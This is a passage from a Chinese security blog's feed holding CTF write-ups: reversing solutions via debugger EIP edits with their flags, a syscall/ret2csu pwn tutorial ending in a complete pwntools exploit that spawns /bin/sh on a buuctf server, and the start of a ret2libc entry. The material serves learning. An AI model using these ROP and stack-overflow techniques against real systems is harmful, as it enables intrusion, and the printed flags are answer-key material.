alt="xctf_game_2.png"></p><p>而在IDA里，此段的基址是<code>0x401000</code></p><p>很清楚了，他们之间偏移了<code>0x300000</code>的地址大小，在IDA里面的所有地址减去<code>0x300000</code>就可以得到在<code>x32dbg</code>里的对应地址。然后注意改<code>eip</code>遵循的原则应该是首先保证栈尽量平衡，并且修改的幅度尽量不大。根据这个原则以及<code>x32dbg</code>给我们程序一开始的断点。</p><p><img src="https://i.loli.net/2021/05/22/jwtIs7krZgyilfN.png" alt="xctf_game_3.png"></p><p>我们把栈顶的值修改成我们要跳转的地方，并且将<code>eip</code>向下调3个语句之后就能直接执行输出<code>flag</code>的语句而不用玩它设计的破游戏了。首先那个函数在IDA里面的地址是<code>0x457ab4</code>，那么在<code>x32dbg</code>里面这个地址就是<code>0x157ab4</code>。我们先把栈顶修改成这个，再把<code>eip</code>改成 <code>0x77661b78</code></p><p><img src="https://i.loli.net/2021/05/22/TicptYsPE9XRSl7.png" alt="xctf_game_4.png"></p><p>这里需要注意的是，由于我们破坏了它的栈，因此尽量避免去执行那些函数，遇到尽量跳过。</p><p><img src="https://i.loli.net/2021/05/22/wPlNWzIcQ7YsGxi.png" alt="xctf_game_5.png"></p><p>这里我们不选择执行<code>printf</code>函数，因为试过就知道由于之前破坏了栈帧会导致不可预估的错误发生，正确做法就是把<code>eip</code>改到<code>call</code>那个之后。</p><p>其实直接改<code>eip</code>也一样的，我那种只是改的其中一种方式。</p><p>然后下面还有一个<code>prinf</code>函数我们也选择不执行，在<code>printf</code>之前下个断点然后F9运行你就可以看到<code>flag</code>了。</p><p><img src="https://i.loli.net/2021/05/23/j9QYM6TUN3KeGuo.png" alt="xctf_game_6.png"></p><p>然后返回游戏一看，啥也没有，但是我已经知道了<code>flag</code>，hhh。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">flag:zsctf&#123;T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t&#125;</span><br></pre></td></tr></table></figure><h2 id="xctf-csaw2013reversing2"><a href="#xctf-csaw2013reversing2" class="headerlink" title="xctf-csaw2013reversing2"></a><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5081&page=1">xctf-csaw2013reversing2</a></h2><p>题目已经说了运行就可以拿<code>flag</code>，但是运行发现弹出来的窗口是乱码，IDA反汇编并且反编译之后检查<code>main</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c</span><br><span class="line"></span><br><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ecx</span><br><span class="line">  CHAR *lpMem; // [esp+8h] [ebp-Ch]</span><br><span class="line">  HANDLE hHeap; // [esp+10h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  hHeap = HeapCreate(0x40000u, 0, 0);</span><br><span class="line">  lpMem = (CHAR *)HeapAlloc(hHeap, 8u, SourceSize + 1);</span><br><span class="line">  memcpy_s(lpMem, SourceSize, &amp;unk_409B10, SourceSize);</span><br><span class="line">  if ( !sub_40102A() &amp;&amp; !IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    MessageBoxA(0, lpMem + 1, &quot;Flag&quot;, 2u);</span><br><span class="line">    HeapFree(hHeap, 0, lpMem);</span><br><span class="line">    HeapDestroy(hHeap);</span><br><span class="line">    ExitProcess(0);</span><br><span class="line">  &#125;</span><br><span class="line">  __debugbreak();</span><br><span class="line">  sub_401000(v3 + 4, lpMem);</span><br><span class="line">  ExitProcess(0xFFFFFFFF);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也太狗了，还会检测在不在调试器中，在的话我还索性不输出了？</p><p>跟进去<code>0x41000</code>函数去看发现有对<code>msgbox</code>输出的<code>flag</code>做了点手脚，那么就猜测可能这个部分是用来算正确的<code>flag</code>的，那么我们的顺序应该是先执行那个函数再输出<code>flag</code>才对。所以一开始我们改<code>eip</code>执行<code>0x41000</code>函数。</p><p>直接改了<code>eip</code>发现并不好使，那么我们就要再<code>main</code>函数里面直接调用<code>main</code>函数的代码了。发现还是不行之后，发现<code>int3</code>指令一直再阻挡，因此把这个指令<code>nop</code>掉。发现可以直接执行那个函数，执行完了之后发现还是要退出程序，那么我们就得寻找输出这个<code>flag</code>的函数，为什么我们不能像上面那个题那样，直接能看到变量的值？</p><p>问得好，我也不知道qwq，只能在线寻师傅解决这个疑问了。</p><p><img src="https://i.loli.net/2021/05/23/8C1M7fQv6yUPJwt.png" alt="xctf_csaw2013reversing2_1.png"></p><p>可以看到这边又两个调用messagebox函数，那么到底选择哪一个，回头看代码里就会发现咱们的messagebox传了四个参数，那么对比一下发现下面的messagebox才是传了四个参数的函数调用，那么我们把eip改到传参那边，运行执行跳出消息框得到flag</p><p><img src="https://i.loli.net/2021/05/23/uRpS1YtevmHThi8.png" alt="xctf_csaw2013reversing2_2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">flag：flag&#123;reversing_is_not_that_hard!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>系统调用</title>
      <link href="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><code>today</code>新的知识又增长了，发现了<code>getshell</code>的另一种方式：<code>syscall</code>和<code>srop</code>。故事还要源于…(此处省略万字输出)</p><span id="more"></span><p>(note:本作者这次有点懒，没有写AT&amp;T汇编，而是一律用了intel汇编，请悉知)</p><p>可能是之前汇编基础不太好吧，竟没有发现<code>syscall</code>这么好用的指令，只要再把<code>/bin/sh</code>传参就能直接打开一个shell，真是妙蛙。但是在系统调用之前要做很多的事情，诸如各类参数传递，以64位的来说，我们要先知道我们要执行的函数系统调用号为59。我也是翻过<code>libc</code>库的，发现<code>system</code>函数实现里面有一段竟然是直接执行<code>execve(&quot;/bin/sh&quot;)</code></p><p><img src="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><p>实属意外了，这是在我有次反汇编<code>libc</code>库的时候发现的，我原来一直是只用<code>system</code>函数<code>getshell</code>的，没想到<code>system</code>内部是通过这样的系统调用来打开<code>shell</code>的。</p><p>那这得学啊，这是基础的基础啊。</p><p>这边给出一下64位Linux的各个系统调用号，这个在Linux的<code>/usr/include/asm/unistd.h </code>下有，我这里截取部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kill 62</span></span><br></pre></td></tr></table></figure><p>emm，经过多方取证呢，发现打开shell不仅要给第一个参数传上<code>/bin/sh</code>字符串，第二第三个字符串都需要置零。64位呢前六个参数是依次给<code>rdi,rsi,rdx,rcx,r8,r9</code>这六个寄存器的。那么我们传参过程就比较艰难，注入代码首先肯定不现实，现在题目基本都是NX保护的挺到位的。所以要去程序里面寻找<code>gadget</code>，由于<code>pop %rbx</code>这个<code>gadget</code>巨难找，在实际应用要懂得变通，比如先给一个寄存器我想要的值然后再<code>mov</code>给<code>rdx</code>，有一样的效果。</p><p>由此就衍生出来一个<code>return to __libc_csu_init</code>简称<code>ret2csu</code>的方法来，其实这个我个人认为没有必要单独拿出来讲，因为就是因为这个特殊的函数基本蕴含了很多时候我们需要的<code>gadget</code>才会被如此传唱的，会了基本的<code>rop</code>攻击就行，<code>ret2csu</code>的原理跟这个就一模一样。</p><p>一般的payload就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fill_data+fake_rbp+(mov rax,<span class="number">59</span>)+pop_rdi+bin_sh_addr+pop_rsi+<span class="number">0</span>+pop_rdx+<span class="number">0</span></span><br></pre></td></tr></table></figure><p>这是一般的payload，如果找不到对应的gadget，可以自己适当变通。</p><h2 id="buuctf-ciscn-s-3"><a href="#buuctf-ciscn-s-3" class="headerlink" title="buuctf:ciscn_s_3"></a><a href="https://buuoj.cn/challenges#ciscn_2019_s_3">buuctf:ciscn_s_3</a></h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>64位无壳的elf程序，扔进<code>IDA</code>竟发现<code>plt</code>表只有可怜的两项，并且实用性也不大的那种。在一般的<code>ret2libc</code>中我们一般通过一个输出函数<code>(puts,write,printf)</code>来泄露地址，然而这里没有可以利用的输出函数，如果你想模仿下面输出一个<code>plt</code>表项内容也可以，不拦你，只是你费尽心思用系统调用的<code>puts</code>或者<code>write</code>为何不直接用<code>execve</code>直接<code>getshell</code>呢？所以我们就确定我们采用<code>syscall</code>的方式去<code>getshell</code>。</p><h3 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h3><p>这一个可以说很明显的一个栈溢出漏洞了，<code>read</code> <code>0x400</code>字节的数据，且缓冲区特别小。</p><h3 id="第一次溢出"><a href="#第一次溢出" class="headerlink" title="第一次溢出"></a>第一次溢出</h3><p>由于程序并未直接提供<code>/bin/sh</code>字符串，因此我们要靠自己，然后最后填上一个<code>main</code>实现二次溢出，第一次写<code>/bin/sh</code>，第二次执行<code>execve(&quot;/bin/sh&quot;)</code>。</p><hr><p>这里提出一点我自己的看法，我认为这个题目有点问题，vlun函数很可能存在栈不平衡的情况，理由有两点</p><p>1.程序正常执行(无溢出)无法正常结束</p><p>2.给<code>24</code>字节大小的数据可以直接覆盖<code>rip</code>，因为我的理解是缓冲区大小<code>16</code>字节再加上一个<code>rbp 8</code>字节应该<code>24</code>个字节才刚刚覆盖到<code>rbp</code>的位置，而无法覆盖返回地址的。</p><hr><p>而且由于我们要调用栈上的数据，且栈是动态的，我们无法准确得知我们写的<code>/bin/sh</code>字符串的所在位置，因此我们第一次溢出可谓是身负重担，不仅要提供<code>/bin/sh</code>字符串还要泄露栈的地址。由于程序只有下面的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br></pre></td></tr></table></figure><p>因此我们必须通过这个函数泄露点什么。</p><p>想想当时程序调用的栈帧是什么样的，什么内容是跟栈的地址有关的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">低地址↑</span><br><span class="line">buf in vlun</span><br><span class="line"></span><br><span class="line">rbp for main</span><br><span class="line">rip for main</span><br><span class="line">rbp for main&#x27;s father function</span><br><span class="line">rip for main&#x27;s father function</span><br><span class="line">高地址↓</span><br></pre></td></tr></table></figure><p>如此我们也可以清楚看到，首先main的rbp是肯定被我们覆盖了的(PS 虽然现在好像是没有的)，然后后面还有一个调用main函数的那个函数的rbp，那个可以确定栈的地址，能输出这个之后我们就可以开始算偏移了。</p><p>gdb调试算算rbp与它们之间的偏移，这里需要注意由于栈不平衡的原因，我们需要手动调一下rip让程序不要异常退出，然后我们调试到leave指令可以观察到此时的栈。</p><p><img src="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p><p>在地址0x7fffffffde20的地方存了__libc_start_main函数的rbp=0x7fffffffdf28，那么计算一下偏移就是264，当前的rsp是main函数的rsp是vlun函数的rbp，所以我们泄露出来的这个地址与vlun函数的rbp偏移了264字节，然后再有16字节的缓冲区，如果我们再缓冲区开始写入<code>/bin/sh</code>字符串的话那么偏移就有280字节的大小。</p><p>然而这些应该是第二次溢出考虑的问题，这里只是分析一下泄露地址的可行性。</p><p>第一次的payload比较简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(main)</span><br></pre></td></tr></table></figure><p>然后接受准备接收rbp，但是在改rip的过程中发现这里还是有0x20个字节才能到rbp的，但是我能直接略过rbp覆盖rip就有点离谱，就不知道main的rbp是存在哪了，也许是存在rip后面了。这个我也不太能讲的清楚，希望有师傅明白的话能为我解答一下，感激不尽。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span><span class="comment">#注意一下栈往低地址增长</span></span><br></pre></td></tr></table></figure><p>那么第一次溢出完美的构造了<code>/bin/sh</code>字符串并且获得了它的地址。</p><h3 id="第二次溢出"><a href="#第二次溢出" class="headerlink" title="第二次溢出"></a>第二次溢出</h3><p>第二次溢出要准备的东西就有点多了。</p><h4 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h4><p>我们需要的gadget有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rdx</span><br></pre></td></tr></table></figure><p>经过努力的寻找我们找到了mov rax,59用于代替pop rax，syscall本来就有，pop rdi很好找，pop rsi也有，唯独就是pop rdx找不着，但是关于rbx的gadget可以看到有一个mov rdx,r13，在libc_csu_init函数有一堆的pop寄存器的操作，我们也可以很容易找到pop r13，那么pop r13和mov rdx,r13两个一结合不就是pop rdx嘛，对吧。</p><p>但是需要注意的是，mov rdx,r13后面跟的并不是ret，所以在执行mov rdx,13这个gadget时候，要把rip及时地劫持回来。它运行到后面之后会执行call ptr[r12+rbx*8]，并且，rbx,rbp,r12~r15都是我们可以随意改的。</p><p>rbx我们置零，r12我们放在我们payload上面的其中一个地方能让它接着执行就可以了。</p><p>那么我们先写payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(pop_rbx_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdx)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br></pre></td></tr></table></figure><p>就是原本传给r12的偏移我用的是+0x48的，结果给报错了，反正这个题挺神奇的，就是感觉少了八字节的数据在里面但是好像又没少，希望有师傅能为我解答一下这个困惑，但是我一般遇到这种情况就偏移多8少8都试试看，如果是32位那就上下偏移4看看。</p><p>最后给师傅们看看结果吧</p><p><img src="/2021/05/22/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28330</span>)</span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">mov_rax=<span class="number">0x04004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span> </span><br><span class="line">syscall=<span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/ban/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\0/bin/sh\0&#x27;</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdxr13_call)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc实战</title>
      <link href="/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/"/>
      <url>/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><code>ret2libc</code>是一个<code>pwner</code>必备的基础知识。</p><p><code>ret2libc</code>为<code> return to libc</code>的缩写，我们需要执行<code>libc</code>函数里面的<code>system(&quot;/bin/sh&quot;)</code></p><p>下面为32位程序并且带.so文件的题目:<a href="https://buuoj.cn/challenges#[OGeek2019]babyrop">buuctfOGeek2019]babyrop</a></p><span id="more"></span><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>下载两个文件先丢进IDA里面</p><p>首先是pwn.elf</p><p><code>shift+F12</code>查看字符串，看到比较有用的就是那个<code>Correct\n</code>但是这个不是逆向题，不用从结果分析，所以这个也是没什么用的，只能等会分析没有看到这个的时候再去整这个。然后也没有看到<code>/bin/sh</code>字符串，那么我们就先放弃字符串入手了。</p><p>查看main的伪C代码，得到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先给你虚晃一枪，自己获得一个我们不知道的数，如果大于0才执行<code>read(fd,&amp;buf,4u);</code>而我们都知道，<code>read()</code>函数第一个参数必须为0才能让我们输入内容，那么这一段代码直接抛弃，它注定啥也干不了。然后执行了一个函数，跟进去看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, 